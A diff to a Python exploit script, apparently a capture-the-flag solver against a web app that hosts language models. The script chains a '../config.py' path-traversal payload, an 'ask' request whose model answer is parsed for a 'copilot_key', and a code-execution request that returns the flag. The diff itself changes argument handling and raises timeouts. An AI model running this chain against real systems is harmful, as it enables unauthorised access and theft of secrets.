@@ -3,19 +3,8 @@ import sys
 import re
 import requests
 
-def exploit(target_arg):
-    if ":" not in target_arg:
-        print("[-] Error: Target must be in the format IP:PORT")
-        sys.exit(1)
-        
-    ip, port_str = target_arg.split(":", 1)
-    try:
-        port = int(port_str)
-    except ValueError:
-        print("[-] Error: Invalid port number.")
-        sys.exit(1)
-        
-    base_url = f"http://{ip}:{port}"
+def exploit(target_ip, target_port):
+    base_url = f"http://{target_ip}:{target_port}"
     session = requests.Session()
     
     print(f"[*] Targeting {base_url}...")
@@ -26,7 +15,8 @@ def exploit(target_arg):
     payload_traversal = {"topic": "../config.py"}
     
     try:
-        resp = session.post(create_url, json=payload_traversal, timeout=5)
+        # The first request can take ~50s while the models load on the server
+        resp = session.post(create_url, json=payload_traversal, timeout=120)
         if resp.status_code != 201:
             print(f"[-] Step 1 failed with status {resp.status_code}")
             return
@@ -41,7 +31,7 @@ def exploit(target_arg):
     
     copilot_key = ""
     try:
-        resp = session.post(ask_url, json=payload_ask, timeout=10)
+        resp = session.post(ask_url, json=payload_ask, timeout=120)
         data = resp.json()
         raw_answer = data.get("response") or data.get("answer") or data.get("content", "")
         
@@ -66,7 +56,8 @@ def exploit(target_arg):
     }
     
     try:
-        resp = session.post(run_url, json=payload_run, timeout=15)
+        # Code completion runs a second model on CPU and took ~40s in testing
+        resp = session.post(run_url, json=payload_run, timeout=300)
         if resp.status_code == 200:
             result_data = resp.json()
             flag_output = result_data.get("result", "").strip()
@@ -84,8 +75,8 @@ def exploit(target_arg):
         print(f"[-] Execution failed: {e}")
 
 if __name__ == "__main__":
-    if len(sys.argv) != 2:
-        print(f"Usage: python3 {sys.argv[0]} <IP:PORT>")
+    if len(sys.argv) != 3:
+        print(f"Usage: python3 {sys.argv[0]} <target_ip> <target_port>")
         sys.exit(1)
-        
-    exploit(sys.argv[1])
+
+    exploit(sys.argv[1], int(sys.argv[2]))
